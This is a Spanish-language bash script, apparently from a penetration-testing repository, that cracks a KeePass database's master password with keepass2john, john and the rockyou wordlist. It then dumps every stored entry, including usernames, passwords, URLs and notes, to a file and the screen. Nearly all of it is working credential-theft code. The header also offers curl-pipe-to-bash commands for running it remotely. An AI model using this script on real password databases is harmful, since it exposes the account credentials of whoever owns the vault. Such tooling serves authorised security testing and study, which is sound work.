#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para extraer credenciales de un archivo de base de datos de KeePass
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/2-Exploit/KeePass/kdbx-ExtraerCredenciales.sh | bash -s [RutaArchivoKDBX] [RutaAWordListEnTextoPlano]
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/2-Exploit/KeePass/kdbx-ExtraerCredenciales.sh | sed 's-sudo--g' | bash -s [RutaArchivoKDBX] [RutaAWordListEnTextoPlano]
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/2-Exploit/KeePass/kdbx-ExtraerCredenciales.sh | nano -
# ----------

# Variables
  vArchivoDeBaseDeDatosKeePass="acquired file (critical).kdbx"
  vArchivoDeDiccionario="/usr/share/wordlists/rockyou.txt"

# Extraer primero el hash del archivo de la base de datos:
  keepass2john "$vArchivoDeBaseDeDatosKeePass" > keepass.hash
  cat keepass.hash

# Intentar crackear el hash
  john --wordlist="$vArchivoDeDiccionario" --rules keepass.hash
  vPass=$(john --show keepass.hash | sed -n '1{s/^[^:]*://;p;q}')

# Extraer datos
  # Comprobar si el paquete keepassxc-full está instalado. Si no lo está, instalarlo.
    if [[ $(dpkg-query -s keepassxc-full 2>/dev/null | grep installed) == "" ]]; then
      echo ""
      echo -e "${cColorRojo}  El paquete keepassxc-full no está instalado. Iniciando su instalación...${cFinColor}"
      echo ""
      sudo apt-get -y update
      sudo apt-get -y install keepassxc-full
      echo ""
    fi

export vArchivoDeBaseDeDatosKeePass vPass

python3 - <<'PY'
#!/usr/bin/env python3
import os
from pykeepass import PyKeePass

# Variables desde el entorno
vKpFile = os.environ.get('vArchivoDeBaseDeDatosKeePass')
vKpPass = os.environ.get('vPass')

if not vKpFile or not vKpPass:
  raise SystemExit("Falta vArchivoDeBaseDeDatosKeePass o vPass en el entorno")

kp = PyKeePass(vKpFile, password=vKpPass)

# Imprime campos comunes por cada entrada (una línea por entrada)
for e in kp.entries:
  vTitle       = e.title or ''
  vUser        = e.username or ''
  vPwd         = e.password or ''
  vUrl         = getattr(e, 'url', '') or ''
  vNotes       = getattr(e, 'notes', '') or ''
  vGroup       = e.group.name if getattr(e, 'group', None) else ''
  vCreated     = getattr(e, 'creation_time', '')
  vModified    = getattr(e, 'last_mod_time', '')
  vExpires     = getattr(e, 'expires', False)
  vExpiryTime  = getattr(e, 'expiry_time', '') or ''
  vAttachments = ','.join([a.filename for a in getattr(e, 'attachments', [])]) or ''

# Abrimos archivo de salida
with open("DatosExtraidos.tab", "w", encoding="utf-8") as f:
  # Cabecera
  f.write(
    "TITLE\tUSER\tPASSWORD\tURL\tGROUP\tCREATED\tMODIFIED\t"
    "EXPIRES\tEXPIRY\tATTACH\tNOTES\n"
  )

  # Filas
  for e in kp.entries:
    vTitle       = e.title or ''
    vUser        = e.username or ''
    vPwd         = e.password or ''
    vUrl         = getattr(e, 'url', '') or ''
    vNotes       = getattr(e, 'notes', '') or ''
    vGroup       = e.group.name if getattr(e, 'group', None) else ''
    vCreated     = getattr(e, 'creation_time', '')
    vModified    = getattr(e, 'last_mod_time', '')
    vExpires     = getattr(e, 'expires', False)
    vExpiryTime  = getattr(e, 'expiry_time', '') or ''
    vAttachments = ','.join([a.filename for a in getattr(e, 'attachments', [])]) or ''

    f.write(
      f"{vTitle}\t{vUser}\t{vPwd}\t{vUrl}\t{vGroup}\t{vCreated}\t"
      f"{vModified}\t{vExpires}\t{vExpiryTime}\t{vAttachments}\t{vNotes}\n"
    )
PY

# Notificar fin de ejecución del script
  echo ""
  echo "  Se ha guardado el archivo DatosExtraídos.tab. El texto que contiene es este:"
  echo ""
  cat DatosExtraidos.tab  | column -t
  echo ""

